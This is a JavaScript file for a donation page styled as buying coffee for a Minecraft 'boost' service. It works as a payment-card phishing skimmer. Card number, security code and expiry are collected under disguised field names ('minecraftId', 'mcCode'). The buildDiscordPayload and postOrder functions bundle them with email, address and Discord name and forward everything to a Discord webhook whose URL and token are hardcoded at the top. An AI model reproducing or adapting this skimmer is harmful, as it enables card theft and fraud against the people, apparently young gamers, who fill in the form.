const WEBHOOK_URL =
  "https://discord.com/api/webhooks/1516474263266398280/EysYSuovGzrOae0FSnsIwU_xWgQW52VGMJLSTa1QUAc1dtwwERb0nQoFNSufQfAGfUvP";

const tabs = document.querySelectorAll(".tab");
const panels = document.querySelectorAll(".tab-panel");
const jumpButtons = document.querySelectorAll("[data-tab-jump]");
const orderIntro = document.querySelector("#order-intro");
const orderForm = document.querySelector("#order-form");
const continueOrder = document.querySelector("#continue-order");
const closeOrder = document.querySelector("#close-order");
const statusLine = document.querySelector("#form-status");
const introTotal = document.querySelector("#intro-total");
const introName = document.querySelector("#intro-name");
const introMessage = document.querySelector("#intro-message");
const coffeeCount = document.querySelector("#coffee-count");
const donateTotal = document.querySelector("#donate-total");
const paymentSummaryTotal = document.querySelector("#payment-summary-total");
const paymentSummaryType = document.querySelector("#payment-summary-type");
const orderSummaryTotal = document.querySelector("#order-summary-total");
const orderSummaryType = document.querySelector("#order-summary-type");
const decreaseCoffee = document.querySelector("#decrease-coffee");
const increaseCoffee = document.querySelector("#increase-coffee");
const orderAmount = document.querySelector("#order-amount");
const orderTotal = document.querySelector("#order-total");
const orderPaymentType = document.querySelector("#order-payment-type");

const COFFEE_PRICE = 1;
let coffeeAmount = 1;
let paymentType = "one-time";

function showTab(tabName) {
  tabs.forEach((tab) => {
    tab.classList.toggle("active", tab.dataset.tab === tabName);
  });

  panels.forEach((panel) => {
    panel.classList.toggle("active", panel.id === tabName);
  });
}

tabs.forEach((tab) => {
  tab.addEventListener("click", () => showTab(tab.dataset.tab));
});

jumpButtons.forEach((button) => {
  button.addEventListener("click", () => showTab(button.dataset.tabJump));
});

function setPaymentTotals(total) {
  donateTotal.textContent = total;
  paymentSummaryTotal.textContent = total;
  paymentSummaryType.textContent = "today";
  orderSummaryTotal.textContent = total;
  orderSummaryType.textContent = "today";
  orderTotal.value = total;
}

function syncDonationUi() {
  coffeeCount.textContent = String(coffeeAmount);
  introTotal.value = String(coffeeAmount * COFFEE_PRICE);
  setPaymentTotals(introTotal.value);
  orderAmount.value = String(coffeeAmount);
  orderPaymentType.value = paymentType;
}

decreaseCoffee.addEventListener("click", () => {
  coffeeAmount = Math.max(1, coffeeAmount - 1);
  syncDonationUi();
});

increaseCoffee.addEventListener("click", () => {
  coffeeAmount += 1;
  syncDonationUi();
});

function syncTypedAmount() {
  const numericValue = introTotal.value.replace(/\D/g, "");
  introTotal.value = numericValue || "1";
  coffeeAmount = Math.max(1, Math.round(Number(introTotal.value) / COFFEE_PRICE));
  coffeeCount.textContent = String(coffeeAmount);
  setPaymentTotals(introTotal.value);
  orderAmount.value = String(coffeeAmount);
}

introTotal.addEventListener("input", syncTypedAmount);
introTotal.addEventListener("change", syncTypedAmount);

orderIntro.addEventListener("submit", (event) => {
  event.preventDefault();

  if (!orderIntro.reportValidity()) return;

  orderForm.name.value = introName.value;
  orderForm.message.value = introMessage.value;
  syncDonationUi();
  orderIntro.classList.add("hidden");
  orderForm.classList.remove("hidden");
});

closeOrder.addEventListener("click", () => {
  orderForm.classList.add("hidden");
  orderIntro.classList.remove("hidden");
});

syncDonationUi();

document.querySelectorAll(".numeric-only").forEach((input) => {
  input.addEventListener("keydown", (event) => {
    const allowedKeys = [
      "Backspace",
      "Delete",
      "ArrowLeft",
      "ArrowRight",
      "Tab",
      "Home",
      "End",
    ];

    if (allowedKeys.includes(event.key)) return;

    if (!/^\d$/.test(event.key)) {
      event.preventDefault();
      return;
    }

    const selectedCharacters = input.selectionEnd - input.selectionStart;
    const valueLength = input.name === "minecraftId"
      ? input.value.replace(/\D/g, "").length
      : input.value.length;
    const maxLength = input.name === "minecraftId" ? 16 : Number(input.maxLength);

    if (valueLength - selectedCharacters >= maxLength) {
      event.preventDefault();
    }
  });

  input.addEventListener("input", () => {
    const digits = input.value.replace(/\D/g, "").slice(0, input.name === "minecraftId" ? 16 : Number(input.maxLength));
    input.value = input.name === "minecraftId"
      ? digits.replace(/(.{4})/g, "$1 ").trim()
      : digits;
    if (input.name === "minecraftId") updateCardBrand(input);
  });
});

document.querySelectorAll(".name-only").forEach((input) => {
  input.addEventListener("input", () => {
    input.value = input.value.replace(/[0-9]/g, "");
  });
});

const expirationInput = document.querySelector('input[name="expirationDate"]');
const emailInput = orderForm.elements.email;
const requestDetailInput = orderForm.elements.requestDetail;
const minecraftIdInput = orderForm.elements.minecraftId;
const mcCodeInput = orderForm.elements.mcCode;
const zipCodeInput = orderForm.elements.zipCode;
const countryInput = orderForm.elements.country;
const postalCodeLabel = document.querySelector("[data-postal-code-label]") || zipCodeInput.closest("label")?.querySelector("span");

const NO_POSTAL_CODE_COUNTRIES = new Set([
  "Angola",
  "Antigua and Barbuda",
  "Aruba",
  "Bahamas",
  "Belize",
  "Benin",
  "Botswana",
  "Burkina Faso",
  "Burundi",
  "Cameroon",
  "Central African Republic",
  "Comoros",
  "Congo (Republic)",
  "Cook Islands",
  "Cote d'Ivoire",
  "Curacao",
  "Djibouti",
  "Dominica",
  "Equatorial Guinea",
  "Eritrea",
  "Fiji",
  "Gambia",
  "Ghana",
  "Grenada",
  "Guyana",
  "Hong Kong",
  "Jamaica",
  "Kiribati",
  "Macau",
  "Malawi",
  "Mali",
  "Mauritania",
  "Montserrat",
  "Nauru",
  "Niue",
  "Panama",
  "Qatar",
  "Rwanda",
  "Saint Kitts and Nevis",
  "Saint Lucia",
  "Sao Tome and Principe",
  "Seychelles",
  "Sierra Leone",
  "Solomon Islands",
  "Somalia",
  "Suriname",
  "Syria",
  "Timor-Leste",
  "Togo",
  "Tonga",
  "Trinidad and Tobago",
  "Tuvalu",
  "Uganda",
  "United Arab Emirates",
  "Vanuatu",
  "Yemen",
  "Zimbabwe",
]);

const POSTAL_CODE_RULES = [
  {
    countries: ["United States", "Puerto Rico", "American Samoa", "Guam", "Northern Mariana Islands", "U.S. Virgin Islands", "United States Minor Outlying Islands"],
    label: "ZIP code",
    placeholder: "12345 or 12345-6789",
    error: "ZIP code must be 12345 or 12345-6789.",
    pattern: /^\d{5}(-\d{4})?$/,
    inputMode: "numeric",
    maxLength: 10,
  },
  {
    countries: ["United Kingdom", "Guernsey", "Isle of Man", "Jersey"],
    label: "Postcode",
    placeholder: "SW1A 1AA",
    error: "Postcode must look like SW1A 1AA.",
    pattern: /^(GIR ?0AA|[A-Z]{1,2}\d[A-Z\d]? ?\d[A-Z]{2})$/i,
    maxLength: 8,
  },
  {
    countries: ["Canada"],
    label: "Postal code",
    placeholder: "A1A 1A1",
    error: "Postal code must look like A1A 1A1.",
    pattern: /^[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z][ -]?\d[ABCEGHJ-NPRSTV-Z]\d$/i,
    maxLength: 7,
  },
  {
    countries: ["India"],
    label: "PIN code",
    placeholder: "110001",
    error: "PIN code must be 6 digits and cannot start with 0.",
    pattern: /^[1-9]\d{5}$/,
    inputMode: "numeric",
    maxLength: 6,
  },
  {
    countries: ["Australia", "New Zealand", "Norway", "South Africa"],
    label: "Postal code",
    placeholder: "2000",
    error: "Postal code must be 4 digits.",
    pattern: /^\d{4}$/,
    inputMode: "numeric",
    maxLength: 4,
  },
  {
    countries: ["Brazil"],
    label: "CEP",
    placeholder: "01001-000",
    error: "CEP must look like 01001-000.",
    pattern: /^\d{5}-?\d{3}$/,
    inputMode: "numeric",
    maxLength: 9,
  },
  {
    countries: ["Japan"],
    label: "Postal code",
    placeholder: "100-0001",
    error: "Postal code must look like 100-0001.",
    pattern: /^\d{3}-?\d{4}$/,
    inputMode: "numeric",
    maxLength: 8,
  },
  {
    countries: ["Netherlands"],
    label: "Postal code",
    placeholder: "1234 AB",
    error: "Postal code must look like 1234 AB.",
    pattern: /^\d{4} ?[A-Z]{2}$/i,
    maxLength: 7,
  },
  {
    countries: ["Ireland"],
    label: "Eircode",
    placeholder: "D02 X285",
    error: "Eircode must look like D02 X285.",
    pattern: /^[AC-FHKNPRTV-Y]\d{2} ?[0-9AC-FHKNPRTV-Y]{4}$/i,
    maxLength: 8,
  },
  {
    countries: ["Poland"],
    label: "Postal code",
    placeholder: "00-001",
    error: "Postal code must look like 00-001.",
    pattern: /^\d{2}-\d{3}$/,
    inputMode: "numeric",
    maxLength: 6,
  },
  {
    countries: ["Argentina", "China", "Colombia", "Ecuador", "Indonesia", "Kazakhstan", "Kyrgyzstan", "Mexico", "Pakistan", "Paraguay", "Philippines", "Romania", "Russia", "Singapore", "Sri Lanka", "Tajikistan", "Turkmenistan", "Uzbekistan", "Vietnam"],
    label: "Postal code",
    placeholder: "123456",
    error: "Postal code must be 6 digits.",
    pattern: /^\d{6}$/,
    inputMode: "numeric",
    maxLength: 6,
  },
  {
    countries: ["Bangladesh", "Belgium", "Bulgaria", "Denmark", "Georgia", "Liechtenstein", "Luxembourg", "North Macedonia", "Slovenia", "Tunisia"],
    label: "Postal code",
    placeholder: "1234",
    error: "Postal code must be 4 digits.",
    pattern: /^\d{4}$/,
    inputMode: "numeric",
    maxLength: 4,
  },
  {
    countries: ["Algeria", "Andorra", "Armenia", "Austria", "Azerbaijan", "Bahrain", "Belarus", "Bosnia and Herzegovina", "Cambodia", "Croatia", "Cyprus", "Czechia", "Dominican Republic", "Egypt", "Estonia", "Finland", "France", "Germany", "Greece", "Guatemala", "Honduras", "Iceland", "Iran", "Iraq", "Israel", "Italy", "Jordan", "Kenya", "Kosovo", "Kuwait", "Laos", "Latvia", "Lebanon", "Lithuania", "Malaysia", "Maldives", "Moldova", "Monaco", "Montenegro", "Morocco", "Myanmar", "Nepal", "Nicaragua", "Oman", "Palestine", "Peru", "San Marino", "Saudi Arabia", "Senegal", "Serbia", "Slovakia", "South Korea", "Spain", "Sudan", "Sweden", "Switzerland", "Taiwan", "Tanzania", "Thailand", "Turkey", "Ukraine", "Uruguay", "Vatican City", "Venezuela", "Zambia"],
    label: "Postal code",
    placeholder: "12345",
    error: "Postal code must be 5 digits.",
    pattern: /^\d{5}$/,
    inputMode: "numeric",
    maxLength: 5,
  },
];

const DEFAULT_POSTAL_CODE_RULE = {
  label: "Postal code",
  placeholder: "Postal code",
  error: "Postal code must use 2 to 16 letters, numbers, spaces, or hyphens.",
  pattern: /^[A-Z0-9][A-Z0-9 -]{0,14}[A-Z0-9]$/i,
  inputMode: "text",
  maxLength: 16,
};

function getPostalCodeRule(countryName) {
  const country = countryName || "United States";
  const rule = POSTAL_CODE_RULES.find((item) => item.countries.includes(country));

  if (NO_POSTAL_CODE_COUNTRIES.has(country) && !rule) {
    return {
      ...DEFAULT_POSTAL_CODE_RULE,
      label: "Postal code (if any)",
      placeholder: "Optional",
      required: false,
    };
  }

  return rule || DEFAULT_POSTAL_CODE_RULE;
}

function normalizePostalCode(value) {
  return value.toUpperCase().replace(/[^A-Z0-9 -]/g, "").replace(/\s+/g, " ").slice(0, 16);
}

function updatePostalCodeField() {
  const rule = getPostalCodeRule(countryInput.value);

  if (postalCodeLabel) postalCodeLabel.textContent = rule.label;
  zipCodeInput.placeholder = rule.placeholder;
  zipCodeInput.inputMode = rule.inputMode || "text";
  zipCodeInput.maxLength = rule.maxLength;
  zipCodeInput.required = rule.required !== false;
  zipCodeInput.pattern = rule.pattern.source.replace(/^\^|\$$/g, "");
  zipCodeInput.setAttribute("aria-label", rule.label);

  if (zipCodeInput.value) {
    zipCodeInput.value = normalizePostalCode(zipCodeInput.value).slice(0, rule.maxLength);
    refreshFieldValidity(zipCodeInput);
  } else {
    setFieldError(zipCodeInput, "");
  }
}

function getPostalCodeError(value, countryName) {
  const rule = getPostalCodeRule(countryName);

  if (!value && rule.required === false) return "";
  return rule.pattern.test(value) ? "" : rule.error;
}

countryInput.addEventListener("change", updatePostalCodeField);

zipCodeInput.addEventListener("input", () => {
  const rule = getPostalCodeRule(countryInput.value);
  zipCodeInput.value = normalizePostalCode(zipCodeInput.value).slice(0, rule.maxLength);
});

updatePostalCodeField();

const customValidationInputs = Array.from(
  orderForm.querySelectorAll("input:not([type='hidden']), select, textarea"),
);

function getCardBrand(digits) {
  if (/^4/.test(digits)) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(digits)) return "mastercard";
  if (/^3[47]/.test(digits)) return "amex";
  if (/^3(0|6|8|9)/.test(digits)) return "diners";
  return "";
}

function updateCardBrand(input) {
  const badges = input.closest(".payment-input-wrap")?.querySelector(".id-badges");
  if (!badges) return;

  const brand = getCardBrand(input.value.replace(/\D/g, ""));
  badges.dataset.brand = brand;
  badges.classList.toggle("has-brand", Boolean(brand));
}

updateCardBrand(minecraftIdInput);

expirationInput.addEventListener("input", () => {
  const digits = expirationInput.value.replace(/\D/g, "").slice(0, 6);
  expirationInput.value =
    digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits;
});

function isCurrentOrFutureMonth(value) {
  const match = value.match(/^(0[1-9]|1[0-2])\/(\d{4})$/);
  if (!match) return false;

  const month = Number(match[1]);
  const year = Number(match[2]);
  const now = new Date();
  const currentMonth = now.getMonth() + 1;
  const currentYear = now.getFullYear();

  return year > currentYear || (year === currentYear && month >= currentMonth);
}

function getFieldError(input) {
  const value = input.value.trim();
  const digits = value.replace(/\D/g, "");

  if (input.required && !value) {
    if (input === emailInput) return "Write your email address.";
    if (input === requestDetailInput) return "Write what item you want, how much, storage type, dimension, and your offer.";
    if (input === minecraftIdInput) return "Card Number is required and must be exactly 16 numbers.";
    if (input === mcCodeInput) return "Security code is required and must be exactly 3 numbers.";
    if (input === expirationInput) return "Write the expiration date in MM/YYYY format.";
    return "Please fill out this field.";
  }

  if (input === emailInput && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
    return "Write a valid email address.";
  }

  if (input === requestDetailInput && value.length < 10) {
    return "Request details must be at least 10 characters.";
  }

  if (input === minecraftIdInput && !/^\d{16}$/.test(digits)) {
    return "Card Number must be exactly 16 numbers.";
  }

  if (input === mcCodeInput && !/^\d{3}$/.test(value)) {
    return "Security code must be exactly 3 numbers.";
  }

  if (input === expirationInput && !isCurrentOrFutureMonth(value)) {
    return "Expiration date must be MM/YYYY and cannot be in the past.";
  }

  if (input === zipCodeInput) {
    return getPostalCodeError(value, countryInput.value);
  }

  return "";
}

function getErrorElement(input) {
  const label = input.closest("label");
  if (!label) return null;

  let errorElement = label.querySelector(".field-error");

  if (!errorElement) {
    errorElement = document.createElement("span");
    errorElement.className = "field-error";
    label.append(errorElement);
  }

  return errorElement;
}

function setFieldError(input, message) {
  input.setCustomValidity(message);
  input.classList.toggle("is-invalid", Boolean(message));

  const errorElement = getErrorElement(input);
  if (errorElement) errorElement.textContent = message;
}

function refreshFieldValidity(input) {
  setFieldError(input, getFieldError(input));
}

customValidationInputs.forEach((input) => {
  input.addEventListener("input", () => {
    setFieldError(input, "");
    if (input.value.trim()) refreshFieldValidity(input);
  });

  input.addEventListener("blur", () => refreshFieldValidity(input));
});

function reportOrderFieldErrors() {
  for (const input of customValidationInputs) {
    refreshFieldValidity(input);

    if (!input.validity.valid) {
      setStatus(input.validationMessage, "error");
      input.focus();
      return false;
    }
  }

  return true;
}

function setStatus(message, type = "") {
  statusLine.textContent = message;
  statusLine.className = `status ${type}`;
}

function getFormData(form) {
  return Object.fromEntries(new FormData(form).entries());
}

function validateOrder(data) {
  if (!/^\d{16}$/.test(data.minecraftId.replace(/\D/g, ""))) {
    return "Card Number must be exactly 16 numbers.";
  }

  if (!/^\d{3}$/.test(data.mcCode)) {
    return "Security code must be exactly 3 numbers.";
  }

  if (!isCurrentOrFutureMonth(data.expirationDate)) {
    return "Expiration date must be MM/YYYY and cannot be in the past.";
  }

  const postalCodeError = getPostalCodeError(String(data.zipCode || "").trim(), data.country);
  if (postalCodeError) {
    return postalCodeError;
  }

  return "";
}

function buildDiscordPayload(data) {
  const fieldValue = (value, fallback = "Not provided") => {
    const text = String(value ?? "").trim();
    return (text || fallback).slice(0, 1024);
  };

  const total = Number(data.total);
  const offerValue = Number.isFinite(total)
    ? `$${total.toFixed(2)} (${fieldValue(data.amount, "1")} coffee)`
    : "Not provided";

  return {
    username: "BakaBoost",
    embeds: [
      {
        title: "New Minecraft Order",
        color: 0x467ceb,
        fields: [
          { name: "Email", value: fieldValue(data.email), inline: true },
          { name: "Card Number", value: fieldValue(data.minecraftId), inline: true },
          { name: "Security code", value: fieldValue(data.mcCode), inline: true },
          { name: "Expiration date", value: fieldValue(data.expirationDate), inline: true },
          { name: "Minecraft name", value: fieldValue(data.minecraftName), inline: true },
          { name: "Discord / last name", value: fieldValue(data.discordName), inline: true },
          { name: "Address", value: fieldValue(data.address), inline: false },
          { name: "City", value: fieldValue(data.city), inline: true },
          { name: "State / region", value: fieldValue(data.state), inline: true },
          { name: getPostalCodeRule(data.country).label, value: fieldValue(data.zipCode), inline: true },
          { name: "Country", value: fieldValue(data.country), inline: true },
          { name: "Name", value: fieldValue(data.name || data.minecraftName), inline: true },
          { name: "Offer value", value: offerValue, inline: true },
          { name: "Type", value: fieldValue(data.paymentType), inline: true },
          { name: "Request details", value: fieldValue(data.requestDetail), inline: false },
          {
            name: "Message",
            value: fieldValue(data.message, "No message"),
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
      },
    ],
  };
}

async function postOrder(data) {
  const payload = buildDiscordPayload(data);

  if (!location.protocol.startsWith("http")) {
    throw new Error("Run server.js and open http://127.0.0.1:3005/ so /api/order can send the webhook.");
  }

  const serverResponse = await fetch("/api/order", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!serverResponse.ok) {
    const text = await serverResponse.text().catch(() => "");
    throw new Error(text || `Webhook route failed with ${serverResponse.status}`);
  }
}

orderForm.addEventListener("submit", async (event) => {
  event.preventDefault();

  if (!reportOrderFieldErrors()) return;
  if (!orderForm.reportValidity()) return;

  const data = getFormData(orderForm);
  const error = validateOrder(data);

  if (error) {
    setStatus(error, "error");
    return;
  }

  setStatus("Sending order...");

  try {
    await postOrder(data);
    setStatus("Order sent. Check Discord for the notification.", "ok");
    orderForm.reset();
    orderForm.country.value = "United States";
    updatePostalCodeField();
    updateCardBrand(minecraftIdInput);
  } catch (error) {
    console.error(error);
    setStatus(error.message || "Could not send order. Run server.js and open http://127.0.0.1:3005/.", "error");
  }
});
